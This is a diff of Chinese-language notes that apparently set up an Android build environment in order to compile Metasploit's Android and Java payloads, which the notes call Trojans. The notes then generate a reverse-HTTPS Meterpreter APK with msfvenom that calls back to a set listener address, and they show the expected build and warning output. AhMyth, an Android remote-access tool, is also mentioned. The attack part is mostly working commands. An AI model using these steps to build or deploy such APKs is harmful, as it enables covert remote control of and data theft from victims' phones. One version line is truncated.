@@ -21,40 +21,56 @@ update-alternatives  --config javac
 3. 安装 Android SDK Platforms最新29, 10 and 19, 并更新 "Android SDK Tools" 和 "Android SDK Platform-tools"
 
 a. AS->File->Setting->System Setting->Android SDK->SDK Platforms
+
 下载Android SDK Platforms——API version 最新的SDK（compileSdkVersion）29+10 +19
 
 b. AS->File->Setting->System Setting->Android SDK->SDK Tools->Show Package Details打勾, 
+
 Android SDK Build Tools
+
 Android SDK Platform-Tools 29.0.5
 Android SDK Tools 26.1.1
 NDK(Side by side)20.0.055
-Cmake 3.10.2
+Cmake 3.10.
 Android SDK Build-Tools 25.0.0(AhMyth)
 Android Emulator 29.2.11
 
 4. 编译AndroidPayload for Metasploit ... SUCCESS 即成功,并把编译新生成的/java/target/data中android文件夹——复制到Metasploit-framework根目录下的data文件夹。
 Android 木马：
+
 cd metasploit-payloads/tree/master/java
+
 mvn package -Dandroid.sdk.path=/root/Android/sdk -Dandroid.release=true -P deploy
+
 返回成功信息：
 [INFO] AndroidPayload for Metasploit ...................... SUCCESS [  8.920 s]
+
 [INFO] Android Meterpreter ................................ FAILURE [  4.153 s]
+
 [INFO] BUILD FAILURE
 
 cd /java/target/data
-cp -r android /usr/share/metasploit-framework/data
 
+cp -r android /usr/share/metasploit-framework/data
 
 java木马：mvn -D deploy.path=/usr/share/metasploit-framework -P deploy package
 
 5.通过msfvenom命令生成APK:
+
 msfvenom
+
 search android
+
 msfvenom -l payloads
+
 msfvenom -p android/meterpreter_reverse_https  LHOST=10.10.10.102 LPORT=4444 -o payload.apk
+
 返回信息：如果开头出现了这三个WARNING，说明msfvenom生成APK时使用的是我们修改后的版本。 
+
 WARNING: Local file /usr/share/metasploit-framework/data/android/apk is being used
+
 WARNING: Local files may be incompatible with the Metasploit Framework
+
 WARNING: Local file /usr/share/metasploit-framework/data/android/apk/classes.dex is being used
 
 
